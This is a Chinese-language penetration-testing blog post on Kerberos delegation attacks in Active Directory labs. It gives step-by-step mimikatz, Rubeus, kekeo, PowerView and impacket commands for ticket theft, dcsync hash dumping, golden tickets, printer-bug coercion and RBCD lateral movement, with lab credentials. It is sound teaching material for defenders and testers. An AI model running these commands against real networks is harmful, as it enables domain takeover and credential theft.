<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="前言域委派是指：将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动
域委派分为三种：

约束委派
非约束委派
基于资源委派

什么是委派委派概念
在kerberos认证机制中，需要访问服务首先需要申请票据认证通过才可以访问。而委派就是用户A访问B服务，但是B需要去C服务调用数据但是">
    

    <!--Author-->
    
        <meta name="author" content="0xEaS">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="内网渗透篇-非约束/约束委派攻击"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="船到桥头自然直"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>内网渗透篇-非约束/约束委派攻击 - 船到桥头自然直</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">
                内网渗透篇-非约束/约束委派攻击
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2022-03-06</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>域委派是指：将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动</p>
<p>域委派分为三种：</p>
<ul>
<li>约束委派</li>
<li>非约束委派</li>
<li>基于资源委派</li>
</ul>
<h2 id="什么是委派"><a href="#什么是委派" class="headerlink" title="什么是委派"></a>什么是委派</h2><p><strong>委派概念</strong></p>
<p>在kerberos认证机制中，需要访问服务首先需要申请票据认证通过才可以访问。而委派就是用户A访问B服务，但是B需要去C服务调用数据但是B没有权限而A有权限，此时B就带着A访问B时所携带的凭证去访问C成功拿到数据。这个过程就称为委派。</p>
<p><strong>非约束委派（Unconstrained Delegation）</strong></p>
<p>A用户访问B服务，如果B服务是非约束委派机器账户就会把A的票据凭证缓存在本地内存中方便下次操作，但是此时B服务就相当于拥有了A用户的所有权限可以访问A用户可以访问的任何服务。</p>
<p>当被设置为非约束性委派时，其<code>userAccountControl</code>属性包含<code>TRUSTED_FOR_DELEGATION</code></p>
<p><strong>约束委派（Unconstrained Delegation）</strong></p>
<p>因为非约束委派的不安全性，所以出现了约束委派。限制了只能委派特定的服务。而不是拥有其用户的所有访问权限。</p>
<p>即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务。</p>
<p>当被设置为约束性委派时，其<code>userAccountControl</code>属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code></p>
<p><strong>小结一下</strong></p>
<p>委派任何服务即为非约束委派</p>
<p>委派特定任务即为约束委派</p>
<p><strong>基于资源的约束委派（Resource-based constrained delegation）</strong></p>
<p>基于资源的约束委派(RBCD)是在Windows Server 2012中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。也就是说机器自身可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置RBCD。</p>
<h2 id="非约束委派利用实验"><a href="#非约束委派利用实验" class="headerlink" title="非约束委派利用实验"></a>非约束委派利用实验</h2><p>当某台主机访问了配置了非约束性委派当主机的服务时候，就会将自己当可转发当TGT发送到配置了非约束性委派当主机上。诱导域管账号访问我们的被配置了非约束委派的主机，这样子我们就拥有了域管的TGT，可以生成黄金票据，然后接管域。</p>
<p><strong>工具AdFind.exe</strong></p>
<pre><code>samAccountType=805306369 是查找机器账户
samAccountType=805306368 是查找服务账户</code></pre>
<p>查找域内<strong>非约束委派机器账户</strong>（目标登录的账号是域内账号）</p>
<pre><code>adFind.exe -b &quot;DC=edu, DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</code></pre>
<p><img src="/images/264.png"></p>
<p>查找域内<strong>非约束委派机器账户</strong>（目标登录的账号是本地账号）</p>
<p>由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。</p>
<ul>
<li>需要获得一个域内账号密码</li>
</ul>
<pre><code>adFind.exe -u eas2 -up chen@2020 -b &quot;DC=edu, DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; cn distinguishedName</code></pre>
<p><img src="/images/265.png"></p>
<p>如果域管或者其他用户访问过非委派约束机器账户上的服务，票据就会被载入本地内存。</p>
<p>用mimikatz导出所有票据</p>
<pre><code>privilege::debug
sekurlsa::tickets /export</code></pre>
<p><img src="/images/266.png"></p>
<p>可以看到名称为<code>[0;9bec9]-2-0-60a00000-Administrator@krbtgt-YUNYING.LAB.kirbi</code>的这一条即为Administrator发送的TGT。</p>
<p>通过mimikatz将该票据载入当前会话中，获得域管Administrator权限</p>
<pre><code>kerberos::ptt [0;9bec9]-2-0-60a00000-Administrator@krbtgt-YUNYING.LAB.kirbi</code></pre>
<p><img src="/images/267.png"></p>
<h2 id="非约束委派-Spooler打印机服务"><a href="#非约束委派-Spooler打印机服务" class="headerlink" title="非约束委派+Spooler打印机服务"></a>非约束委派+Spooler打印机服务</h2><p>如果只是单纯的非约束委派话需要管理员主动连接，所以在实战环境利用比较鸡肋。</p>
<p>利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接</p>
<p>利用原理：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。</p>
<ul>
<li><code>Print Spooler</code>服务默认是自动运行的</li>
</ul>
<p><img src="/images/274.png"></p>
<p><strong>自己本地复现失败了，所以贴了先知社区文章中的复现</strong></p>
<p>操作环境：</p>
<ul>
<li>域：<code>test.local</code></li>
<li>域控：系统：<code>Windows server 2012R2</code>主机名：<code>DM2012</code>，ip：<code>192.168.141.134</code></li>
<li>域内主机：系统：<code>windows 10</code>，主机名：<code>win10</code>，ip：<code>192.168.141.165</code></li>
</ul>
<p>这个实现了前提是：需要获取一台主机账户开启了非约束委派域内机器的权限</p>
<p>我们给win10这个主机账户开启非约束委派</p>
<p><img src="/images/275.png"></p>
<p><strong>注</strong>：是主机账户开启非约束委派，而不是服务用户</p>
<p><code>tifkin_</code>在他的github上开源了POC：<a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p>
<p>向DM2012的<code>Spooler</code>服务发送请求，强制其访问win10进行身份验证</p>
<pre><code>SpoolSample.exe dm2012 win10</code></pre>
<p><img src="/images/276.png"></p>
<p>我们可以用<code>Rubeus</code>来监听<code>Event ID</code>为<code>4624</code>事件，这样可以第一时间截取到域控的TGT</p>
<p>每隔一秒监听一次来自<code>dm2012</code>的登陆（需要本地管理员权限）</p>
<pre><code>Rubeus.exe monitor /interval:1 /filteruser:dm2012$</code></pre>
<p><strong>注</strong>：Rubeus.exe捕获到的TGT是base64编码的，但是我们不需要解码，<code>Rubeus</code>可以直接将base64编码的票据直接注入到内存中</p>
<pre><code>Rubeus.exe ptt /ticket:base64</code></pre>
<p>因为我们Rubeus监听TGT用不了，所以我们可以用<code>mimikatz</code>导出TGT</p>
<pre><code>privilege::debug

sekurlsa::tickets /export</code></pre>
<p>可以发现成功导出来自<code>DM2012$</code>的TGT</p>
<p><img src="/images/277.png"></p>
<p><img src="/images/278.png"></p>
<p>得到TGT之后，我们用ptt将票据注入到当前会话后，可以用<code>dcsync</code>导出域控中所有用户的hash，然后用<code>krbtgt</code>用户的hash生成黄金票据</p>
<pre><code>kerberos::ptt [0;862bdd]-2-0-60a10000-DM2012$@krbtgt-TEST.LOCAL.kirbi

lsadump::dcsync /domain:test.local /all /csv</code></pre>
<p><img src="/images/279.png"></p>
<p>得到<code>krbtgt</code>用户的hash之后生成一张administrator的黄金票据</p>
<pre><code>kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-662417213-3583657854-423750704 /krbtgt:683545df56ea57b168d0ad090e209616 /ptt</code></pre>
<p>成功以administrator的身份访问域控</p>
<h2 id="约束委派利用实验"><a href="#约束委派利用实验" class="headerlink" title="约束委派利用实验"></a>约束委派利用实验</h2><p>查找<strong>约束委派服务账户</strong></p>
<pre><code>AdFind.exe -b &quot;dc=edu, dc=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</code></pre>
<p><img src="/images/268.png"></p>
<p>使用kekeo工具构造yuesu服务账号的票据</p>
<ul>
<li>获得yuesu服务账户的明文密码或者NTLM</li>
</ul>
<pre><code>kekeo # tgt::ask /user:yuesu /domain:edu.org /password:chen@2022 /ticket:test.kirbi

kekeo # tgt::ask /user:yuesu /domain:edu.org /NTLM:b1f40ef2b02080513f799584e11a8411 /ticket:test.kirbi</code></pre>
<p><img src="/images/269.png"></p>
<p>通过这张TGT伪造s4u请求以administrator用户身份去访问WIN-105NMK8GB23.edu.org的CIFS的ST</p>
<pre><code>kekeo # tgs::s4u /tgt:TGT_yuesu@EDU.ORG_krbtgt~edu.org@EDU.ORG.kirbi /user:administrator@edu.org /service:cifs/WIN-105NMK8GB23.edu.org</code></pre>
<p><img src="/images/270.png"></p>
<p>使用mimikatz将该票据注入到当前内存中</p>
<p><img src="/images/271.png"></p>
<p>接管域</p>
<p><img src="/images/272.png"></p>
<p><img src="/images/273.png"></p>
<h2 id="基于资源的约束委派利用"><a href="#基于资源的约束委派利用" class="headerlink" title="基于资源的约束委派利用"></a>基于资源的约束委派利用</h2><p><strong>环境</strong></p>
<pre><code>域： edu.org
域控：Windows server 2016， 主机名： AD， IP： 192.168.88.131
委派的域内主机：系统：win10，主机名：EAS3，ip：192.168.88.135
域内普通用户： ziyuan，对EAS3有写的权限
域内普通用户： eas11
攻击机器：系统：win10 主机名：EAS111 ip：192.168.88.140 登录用户为eas11</code></pre>
<p>设置ziyuan的写权限</p>
<p><img src="/images/280.png"></p>
<p>验证<strong>ziyuan</strong>这个用户对EAS3是否具有写权限，可以使用PowerView枚举EAS3.edu.org的中的特定ACE</p>
<p>PowerView工具地址<a target="_blank" rel="noopener" href="https://github.com/shigophilo/tools/">https://github.com/shigophilo/tools/</a></p>
<p>打开powershell更改执行策略</p>
<pre><code>Set-ExecutionPolicy Bypass -Scope Process</code></pre>
<p>导入PowerView.ps1</p>
<pre><code>Import-Module .\PowerView.ps1</code></pre>
<p>查看权限</p>
<pre><code>Get-DomainUser -Identity ziyuan -Properties objectsid         # 查询test的SID
Get-DomainObjectAcl -Identity EAS3  | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-3298638106-3321833000-1571791979-1106&quot;&#125;     # 查看是否有写权限</code></pre>
<p><img src="/images/281.png"></p>
<p>可以看到ziyuan这个用户对EAS3这个计算机账户拥有完全控制权限（GenericAll），其实也不一定需要<code>GenericAll</code>权限，<code>GenericWrite</code>、<code>WriteProperty</code>、<code>WriteDacl</code>等等权限都是可以修改账户属性的。</p>
<p><strong>创建机器用户</strong><br>我们现在还需要的是一个具有SPN的账户，因为S4U2Self只适用于具有SPN的账户，恰好的是在域中有一个属性MachineAccountQuota，这个值表示的是允许用户在域中创建的计算机帐户数，默认为10，这意味着我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户，而计算机账户默认是注册RestrictedKrbHost/domain和HOST/domain这两个SPN的，所以这里刚好符合我们的意图。</p>
<p>我们可以使用Kevin Robertson的Powermad中的New-MachineAccount来创建一个用户名为evilsystem，密码为evil的计算机账户<br><strong>导入Powermad.ps1，创建机器账户</strong></p>
<pre><code>Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount evilsystem -Password $(ConvertTo-SecureString &quot;evil&quot; -AsPlainText -Force)</code></pre>
<p><img src="/images/282.png"></p>
<p><strong>配置evilsystem到EAS3的基于资源约束的委派</strong><br>下面是修改EAS3的msDS-AllowedToActOnBehalfOfOtherIdentity属性的值，有两种方法可以修改，Powerview或者ActiveDirectory模块</p>
<p>查看evilsystem机器账户的SID</p>
<pre><code>Get-NetComputer &quot;evilsystem&quot; </code></pre>
<p>powershell执行以下命令</p>
<pre><code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3658974542-4157274802-4269447764-2604)&quot;  #这儿的sid是我们创建的机器用户evilsystem的sid

$SDBytes = New-Object byte[] ($SD.BinaryLength)

$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer EAS3 | Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes&#125; -Verbose</code></pre>
<p>验证是否成功</p>
<pre><code>Get-DomainComputer EAS3 -Properties msds-allowedtoactonbehalfofotheridentity</code></pre>
<p><img src="/images/283.png"></p>
<p>若想清除msds-allowedtoactonbehalfofotheridentity属性的值，可用如下命令：</p>
<pre><code>Set-DomainObject EAS3 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose</code></pre>
<p>配置完msDS-AllowedToActOnBehalfOfOtherIdentity属性之后就可以通过基于资源的约束委派去攻击目标主机了攻击过程</p>
<p><strong>攻击</strong></p>
<p>这儿我们使用<code>Rubeus来</code>进行请求白银票据</p>
<p>因为Rubeus是不支持明文的，所以先把它转换为hash</p>
<pre><code>rubeus.exe hash /user:evilsystem /password:evil /domain:edu.org</code></pre>
<p><img src="/images/284.png"></p>
<p>然后用evilsystem$的hash请求白银票据并导入到当前会话中</p>
<pre><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/EAS3 /ptt

Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:host/EAS3 /ptt</code></pre>
<p><img src="/images/285.png"></p>
<p><img src="/images/286.png"></p>
<p>这儿需要导入两个票据才能用psexec连接<code>EAS3</code>(需要管理员权限运行cmd)</p>
<pre><code>psexec64 \\EAS3 cmd</code></pre>
<p><img src="/images/287.png"></p>
<h2 id="实战常用"><a href="#实战常用" class="headerlink" title="实战常用"></a>实战常用</h2><p>当我们知道资源的约束委派攻击的简要后就可以知道：资源的约束委派不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的权限，说白了其实就是：<strong>计算机加入域时，加入域的域用户和被加入域的域机器自身拥有权限。</strong></p>
<p>换句话说如果我们拥有配置某台主机 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的权限与创建机器账户的权限，那我们就相当于拿到了此机器的所有权限。至于为什么是机器账户，而不能是普通用户的账户，因为攻击的时候会利用到 <code>S4U2Self</code> 协议，而它只适用于具有 <code>SPN</code> 的账户，普通账户是没有 <code>SPN</code> 的，而机器账户是有的。</p>
<p>那么谁有修改某台主机 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 的权限呢？</p>
<p><img src="/images/288.png"></p>
<p><img src="/images/289.png"></p>
<p>看上面这两张图，**<code>win7</code> （机器名）这台机器在加域的时候填写的域内账户是 <code>saulgoodman</code>，那么 <code>saulgoodman</code> 这个域用户就有修改 <code>win7</code> （机器名）这台主机的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的权限**。</p>
<p><strong>在大型内网域环境中，将机器加入到域环境中一般不会用域管权限，而是用一个专门加域的域用户（例如上图的 saulgoodman 就是一个加域用户）去操作。那么当我们拿下该域用户的账号密码时，就可以把通过该域用户加入到域里的所有机器都拿下。</strong></p>
<p>所以如何想利用基于资源的约束性委派进行攻击的话就需要如下两个点：</p>
<ul>
<li>一个机器账户</li>
</ul>
<p>域内用户都有一个属性叫做 <code>ms-ds-MachineAccountQuota</code>，它代表的是允许用户在域中常见计算机账户的个数，默认是10。那么这就代表我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户也就是机器账户。</p>
<ul>
<li>一个有权利修改 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 的账户</li>
</ul>
<p><strong>攻击者可以查询域内计算机的 <code>mS-DS-CreatorSID</code>，这个值代表的是将计算机加入到域内的用户，它是具有修改 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>的权限的，如果我们可以拿到那个用户的凭据，就可以控制那个用户添加到域内的所有的电脑。</strong></p>
<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a><strong>攻击原理</strong></h3><p>首先添加机器账户，修改 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 值为机器账户的 <code>sid</code>，然后以机器账户的身份伪造成 <code>administrator</code> 申请一张访问此机器账户机器的 <code>ticket</code>(类似于白银票据)，因为机器账户没有配置约束性委派，所以这张票据是不可转发的，但是在基于资源的约束性委派中，票据是否可以转发不重要，对之后对 <code>s4u2proxy</code> 不影响，最后利用这张 <code>ticket</code> 去申请访问修改了 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性的机器。</p>
<h3 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h3><h4 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h4><p><strong>环境</strong></p>
<pre><code>kali攻击机 192.168.80.131
Server 2016 DC 192.168.88.131 域 EDU.ORG
Win10 域内普通主机 主机名:EAS111 IP:192.168.80.130 | 192.168.88.140 登录用户EDU\EAS11 域内普通用户
Win10 域内普通主机 主机名:EAS3   IP:192.168.88.135 登录用户EDU\EAS2 域内普通用户

EAS3是EAS2用户加入域内的机器，我们拿下的EAS111这台机器,并获得了EAS2账户的密码明文或者hash</code></pre>
<p>利用AdFind.exe查询每个域机器是由哪个域用户添加进域的，通过 <code>mS-DS-CreatorSID</code> 查看域用户的 <code>sid</code></p>
<pre><code>AdFind.exe  -b &quot;DC=edu,DC=org&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</code></pre>
<p><img src="/images/290.png"></p>
<p>那么问题来了，我们怎么知道 <code>S-1-5-21-3658974542-4157274802-4269447764-1602</code> 是那个域用户的 sid 呢?</p>
<p>可以使用 sid2user 来帮助我们完成：（需要把 <code>-</code> 去掉）</p>
<pre><code>sid2user.exe \\192.168.88.131 5 21 3658974542 4157274802 4269447764 1602

Name is EAS2
Domain is EDU
Type of SID is SidTypeUser</code></pre>
<p>但是往往一般是我们获得到一个域内普通用户，然后查询改用户SID进行比对。</p>
<pre><code>Import-Module .\PowerView.ps1
Get-DomainUser -Identity EAS2 -Properties objectsid  </code></pre>
<p><img src="/images/291.png"></p>
<p><strong>利用EAS2添加一台机器账户</strong></p>
<p>因为需要用机器用户去申请票据，本身的 EAS111机器账户我们不知道他的密码所以无法申请票据，所以我们需要添加一个机器用户，用来帮助我们申请票据</p>
<pre><code>proxychains python3 addcomputer.py -dc-ip 192.168.88.131 -computer-name &#39;test03$&#39; -computer-pass test03 edu.org/eas2:chen@2020

proxychains python3 addcomputer.py -dc-ip 192.168.88.131 -computer-name &#39;test03$&#39; -computer-pass test03 edu.org/eas2 -hashes bd716f724510ab40f3b89f686411b8cf:bd716f724510ab40f3b89f686411b8cf</code></pre>
<p><img src="/images/292.png"></p>
<p><strong>设置test03到EAS3的RBCD</strong></p>
<pre><code>proxychains python3 rbcd.py -delegate-from test03$ -delegate-to EAS3$ -dc-ip 192.168.88.131 edu.org/eas2:chen@2020 -action write

proxychains python3 rbcd.py -delegate-from test03$ -delegate-to EAS3$ -dc-ip 192.168.88.131 edu.org/eas2 -action write -hashes bd716f724510ab40f3b89f686411b8cf:bd716f724510ab40f3b89f686411b8cf</code></pre>
<p><img src="/images/293.png"></p>
<p><strong>模拟域管理员administrator账号申请访问EAS3的ST，ptt，然后wmiexec到目标主机</strong></p>
<pre><code>proxychains python3 getST.py -spn cifs/EAS3.edu.org -impersonate administrator -dc-ip 192.168.88.131 edu.org/test03$:test03</code></pre>
<p><img src="/images/294.png"></p>
<p><strong>导入票据</strong></p>
<pre><code>export KRB5CCNAME=administrator.ccache</code></pre>
<p><img src="/images/295.png"></p>
<p><strong>wmiexec到目标主机</strong></p>
<pre><code>proxychains python3 wmiexec.py -dc-ip 192.168.88.131 -no-pass -k administrator@EAS3.edu.org</code></pre>
<p><img src="/images/296.jpg"></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>方法同横向一样</p>
<p><img src="/images/296.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>非约束委派场景</strong></p>
<p>当我们在域内拿到一台配置了非约束委派的主机后，就可以使用mimikatz导出所有票据，若是有其他用户访问过该主机，那么我们就可以通过ptt获取该用户权限。</p>
<p>当然我们也可以诱导域管访问该主机，例如通过给管理员发诱饵文件修改Desktop.ini，或是outlook等等。详情可参考<a target="_blank" rel="noopener" href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/5">daiker师傅的发起NTLM请求</a></p>
<p>还有一个很重要的就是<u>非约束委派+Spooler打印机服务</u>，因为Spooler默认就是开启的。</p>
<p><strong>约束委派场景</strong></p>
<p>约束委派可以作为变种黄金票据，用作后门权限维持</p>
<p>打下配置了约束委派的服务账号，我们就可以拿下被配置的约束委派的服务(A-&gt;B)</p>
<p><strong>基于资源的约束委派场景</strong></p>
<p>A配置了到B的RBCD，打下A就可以打下B。和约束委派横向利用场景一致</p>
<p>拿下一个域内普通用户权限，就可以拿下该用户加入域内的所有机器</p>
<p>权限提升</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/198381.html">Kerberos协议探索系列之委派篇</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7217#toc-8">域渗透——Kerberos委派攻击</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a3320315/article/details/107096250/">域渗透——基于资源的约束委派利用</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10061#toc-11">Kerberos委派攻击的那些事</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247488874&idx=1&sn=5c2961b213b5b0743ff7d665c2845443&chksm=c172cf76f6054660c69e7838f34d141064f309206def00e66a354590fe56ce32d1f4ff38364d&mpshare=1&scene=23&srcid=0310JucKxdBxjgbDz6XjbQIE&sharer_sharetime=1646877301325&sharer_shareid=79f27f6e56ba23e3a1134e77ab528270#rd">域渗透之委派攻击详解</a></p>

    </div>

    

    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">内网渗透篇-NTLM Relay攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">内网渗透篇-非约束/约束委派攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">内网渗透篇-隧道代理</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Thinkphp6.0.12LTS反序列化漏洞分析</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://telegram.org/">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
